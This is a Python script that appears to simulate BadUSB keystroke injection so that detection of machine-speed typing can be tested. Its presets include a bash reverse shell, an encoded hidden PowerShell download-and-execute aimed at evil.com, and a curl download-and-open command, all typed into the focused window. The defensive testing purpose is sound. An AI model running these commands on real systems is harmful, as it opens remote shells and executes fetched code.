"""
DuckyGuard - Synthetic BadUSB Attack Simulator
Simulates micro-controller keystroke injection (Flipper Zero / Rubber Ducky)
at non-human velocities for live defense verification and demonstrations.
"""

import random
import time
from typing import Optional
from pynput.keyboard import Controller, Key


class BadUSBSimulator:
    """
    Injects synthetic keyboard events at variable typing profiles:
    - Microcontroller BadUSB: 50-80 chars/second, ultra-low jitter (10-15ms interval)
    - Benign Human: 5-8 chars/second, high jitter (120-240ms interval)
    """

    PRESETS = {
        "resume_dropper": (
            'curl -sL -o /tmp/test_resume.pdf "https://raw.githubusercontent.com/stevenhainley/Steves-LinkedIn-BadUSB/main/Steven_Hainley_Resume.pdf" && open /tmp/test_resume.pdf\n'
        ),
        "reverse_shell": (
            'bash -i >& /dev/tcp/198.51.100.42/4444 0>&1\n'
        ),
        "powershell_enc": (
            'powershell.exe -w hidden -enc aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZQB2AGkAbAAuAGMAbwBtAC8AcABheQBsAG8AYQBkAC4AcABzADEAJwApAA==\n'
        ),
        "benign_human": (
            'The quick brown fox jumps over the lazy dog and types at normal human typing speed.'
        ),
    }

    def __init__(self):
        self.keyboard = Controller()

    def run_simulation(
        self,
        preset_name: str = "resume_dropper",
        custom_text: Optional[str] = None,
        is_badusb: bool = True,
        initial_countdown_sec: int = 3,
    ):
        """
        Executes keystroke simulation after an optional countdown.
        """
        text = custom_text or self.PRESETS.get(preset_name, self.PRESETS["resume_dropper"])

        print(f"\n[*] Preparing {'BadUSB Attack Injection' if is_badusb else 'Benign Human Typing'}...")
        print(f"[*] Payload Preview: {text[:60]}...")
        for i in range(initial_countdown_sec, 0, -1):
            print(f"    Firing in {i}s... Focus any test area or leave active.")
            time.sleep(1.0)
        print("[!] FIRING INJECTION STREAM NOW!\n")

        for char in text:
            self.keyboard.type(char)
            if is_badusb:
                # Synthetic microcontroller timing: uniform 12ms delay (approx 83 chars/sec)
                time.sleep(0.012)
            else:
                # Human typing timing: variable 100ms - 220ms delay with natural hesitation
                time.sleep(random.uniform(0.10, 0.22))

        print("[✓] Simulation completed.\n")
